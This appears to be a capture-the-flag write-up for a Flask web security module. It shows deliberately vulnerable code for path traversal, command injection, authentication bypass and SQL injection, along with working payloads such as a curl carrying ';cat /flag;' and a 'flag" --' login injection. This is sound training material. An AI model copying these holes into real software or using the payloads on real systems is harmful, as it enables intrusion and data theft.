<div align="center">
    <h1> Web Security</h1> 
</div>

### Level 1 - Exploit a path traversal vulnerability

```python
===== Welcome to Web Security! =====
In this series of challenges, you will be working to break web applications!
Read the code for the level, find the security vulnerability, and develop an exploit to get the flag.
Note that the web application is running Python and using the Flask library, so see the Flask documentation as necessary.

Here's the source code of this level:
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

```bash
$ curl http://challenge.localhost/?path=/flag
```

### Level 2 - Exploit a command injection vulnerability

```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

```bash
$ curl 'http://challenge.localhost?timezone=UTC;cat%20/flag;'
```

### Level 3 - Exploit an authentication bypass vulnerability

```python
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))-

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```



```bash
$ curl http://challenge.localhost/?user=1-
```

### Level 4 - Exploit a structured query language injection vulnerability to login

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

```python
import requests 

form = { 
    "username" : 'flag" --', 
    "password" : "idk", 
} 

response = requests.post("http://challenge.localhost/", data=form) 

print(response.text.strip()) 
```

### Level 5 - Exploit a structured query language injection vulnerability to leak data

```python
def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

